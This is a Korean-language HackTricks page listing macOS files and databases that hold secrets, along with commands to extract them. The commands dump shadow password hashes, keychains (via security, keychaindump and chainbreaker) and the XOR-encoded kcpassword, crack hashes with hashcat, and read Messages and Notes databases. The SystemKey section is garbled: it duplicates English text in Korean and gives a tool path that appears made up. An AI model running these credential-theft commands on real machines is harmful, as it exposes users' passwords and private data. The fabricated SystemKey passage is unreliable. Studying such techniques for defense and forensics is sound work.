# macOS 민감한 위치

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## 비밀번호

### 그림자 비밀번호

그림자 비밀번호는 사용자의 구성과 함께 **`/var/db/dslocal/nodes/Default/users/`**에 위치한 plist에 저장됩니다.\
다음의 원라이너를 사용하여 **사용자에 대한 모든 정보** (해시 정보 포함)를 덤프할 수 있습니다:

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**이와 같은 스크립트**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) 또는 [**이 스크립트**](https://github.com/octomagon/davegrohl.git)를 사용하여 해시를 **hashcat 형식**으로 변환할 수 있습니다.

다음은 모든 비서비스 계정의 자격 증명을 `-m 7100` (macOS PBKDF2-SHA512)의 hashcat 형식으로 덤프하는 대체 one-liner입니다:

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### 키체인 덤프

security 바이너리를 사용하여 암호를 복호화하여 덤프할 때, 사용자에게 이 작업을 허용하도록 여러 프롬프트가 나타납니다.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
[이 댓글](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)에 따르면 이 도구들은 Big Sur에서 더 이상 작동하지 않는 것 같습니다.
{% endhint %}

### Keychaindump 개요

**keychaindump**라는 도구는 macOS 키체인에서 비밀번호를 추출하기 위해 개발되었으나, [토론](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)에 따르면 Big Sur와 같은 최신 macOS 버전에서는 제한이 있습니다. **keychaindump**의 사용을 위해서는 공격자가 **root** 권한을 획득하고 권한을 상승시켜야 합니다. 이 도구는 사용자 로그인 시 편의를 위해 기본적으로 키체인이 잠금 해제되어 있어 애플리케이션이 사용자의 비밀번호를 반복해서 요구하지 않고도 액세스할 수 있는 사실을 이용합니다. 그러나 사용자가 각 사용 후 키체인을 잠그기로 선택한 경우 **keychaindump**는 효과가 없어집니다.

**Keychaindump**는 **securityd**라는 특정 프로세스를 대상으로 작동합니다. Apple은 이 프로세스를 인가 및 암호화 작업을 위한 데몬으로 설명하며, 키체인에 액세스하는 데 중요합니다. 추출 과정은 사용자의 로그인 비밀번호에서 유도된 **마스터 키**를 식별하는 것으로 이루어집니다. 이 키는 키체인 파일을 읽는 데 필수적입니다. **keychaindump**는 `vmmap` 명령을 사용하여 **securityd**의 메모리 힙을 스캔하여 `MALLOC_TINY`로 플래그 지정된 영역 내에서 잠재적인 키를 찾습니다. 다음 명령을 사용하여 이러한 메모리 위치를 검사합니다:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
잠재적인 마스터 키를 식별한 후, **keychaindump**는 마스터 키 후보를 나타내는 특정 패턴 (`0x0000000000000018`)을 힙에서 검색합니다. **keychaindump**의 소스 코드에 설명된 대로, 이 키를 활용하기 위해서는 해독을 포함한 추가 단계가 필요합니다. 이 영역에 집중하는 분석가들은 키체인을 복호화하기 위한 중요한 데이터가 **securityd** 프로세스의 메모리에 저장되어 있다는 점을 유의해야 합니다. **keychaindump**를 실행하기 위한 예시 명령어는 다음과 같습니다:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker)는 OSX 키체인에서 다음과 같은 유형의 정보를 법적으로 안전한 방식으로 추출하는 데 사용할 수 있습니다:

* 해시된 키체인 비밀번호, [hashcat](https://hashcat.net/hashcat/) 또는 [John the Ripper](https://www.openwall.com/john/)로 크래킹에 적합합니다.
* 인터넷 비밀번호
* 일반 비밀번호
* 개인 키
* 공개 키
* X509 인증서
* 보안 메모
* Appleshare 비밀번호

키체인 잠금 비밀번호, [volafox](https://github.com/n0fate/volafox) 또는 [volatility](https://github.com/volatilityfoundation/volatility)를 사용하여 얻은 마스터 키 또는 SystemKey와 같은 잠금 해제 파일이 제공되면 Chainbreaker는 평문 비밀번호도 제공합니다.

키체인을 잠금 해제하는 이러한 방법 중 하나가 없으면 Chainbreaker는 사용 가능한 다른 모든 정보를 표시합니다.

#### **키체인 키 덤프**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKey를 사용하여 키체인 키(비밀번호 포함) 덤프하기**

SystemKey is a tool that can be used to dump keychain keys, including passwords, from a macOS system. It is a powerful privilege escalation technique that can be used by hackers to gain unauthorized access to sensitive information.

SystemKey는 macOS 시스템에서 키체인 키를 덤프하는 데 사용할 수 있는 도구입니다. 이는 해커가 미승인된 접근 권한으로 민감한 정보에 접근하는 데 사용할 수 있는 강력한 권한 상승 기술입니다.

To use SystemKey, you need root privileges on the target macOS system. Once you have obtained root access, you can run the following command to dump the keychain keys:

SystemKey를 사용하려면 대상 macOS 시스템에서 root 권한이 필요합니다. root 액세스를 획득한 후 다음 명령을 실행하여 키체인 키를 덤프할 수 있습니다:

```bash
/System/Library/Extensions/SystemKey.kext/Contents/Resources/SystemKeyTool -d
```

This command will dump all the keychain keys, including passwords, to the terminal. The output will contain sensitive information that can be used by hackers to gain unauthorized access to various accounts and services.

이 명령은 모든 키체인 키(비밀번호 포함)를 터미널에 덤프합니다. 출력에는 해커가 다양한 계정과 서비스에 미승인된 액세스를 얻는 데 사용할 수 있는 민감한 정보가 포함됩니다.

It is important to note that using SystemKey to dump keychain keys without proper authorization is illegal and unethical. This technique should only be used for legitimate purposes, such as penetration testing or authorized security audits.

SystemKey를 사용하여 적절한 권한 없이 키체인 키를 덤프하는 것은 불법적이고 윤리적으로 문제가 됩니다. 이 기술은 침투 테스트나 승인된 보안 감사와 같은 합법적인 목적으로만 사용해야 합니다.
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **해시를 크래킹하여 키체인 키(비밀번호 포함) 덤프하기**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **메모리 덤프를 사용하여 키체인 키(비밀번호 포함) 덤프하기**

**메모리 덤프**를 수행하려면 [다음 단계](..#osxpmem을 사용하여 메모리 덤프하기)를 따르세요.
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **사용자의 비밀번호를 사용하여 키체인 키(비밀번호 포함) 덤프하기**

사용자의 비밀번호를 알고 있다면, 해당 비밀번호를 사용하여 사용자에게 속한 키체인을 덤프하고 복호화할 수 있습니다.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

**kcpassword** 파일은 **사용자의 로그인 비밀번호**를 저장하는 파일입니다. 그러나 이 파일은 시스템 소유자가 **자동 로그인을 활성화**한 경우에만 사용됩니다. 따라서 사용자는 비밀번호를 묻지 않고 자동으로 로그인됩니다 (이는 안전하지 않습니다).

비밀번호는 **`/etc/kcpassword`** 파일에 **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** 키로 xor 연산된 상태로 저장됩니다. 사용자의 비밀번호가 키보다 길 경우, 키는 재사용됩니다.\
이로 인해 비밀번호는 [**이 스크립트**](https://gist.github.com/opshope/32f65875d45215c3677d)와 같은 스크립트를 사용하여 쉽게 복구할 수 있습니다.

## 데이터베이스에서 흥미로운 정보

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### 알림

알림 데이터는 `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`에서 찾을 수 있습니다.

가장 흥미로운 정보는 **blob**에 있을 것입니다. 따라서 해당 내용을 **추출**하고 **인간이 읽을 수 있는** 형태로 **변환**하거나 **`strings`**를 사용해야 합니다. 액세스하려면 다음을 수행할 수 있습니다:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### 노트

사용자의 **노트**는 `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`에서 찾을 수 있습니다.

{% endcode %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기교를 공유하세요.

</details>
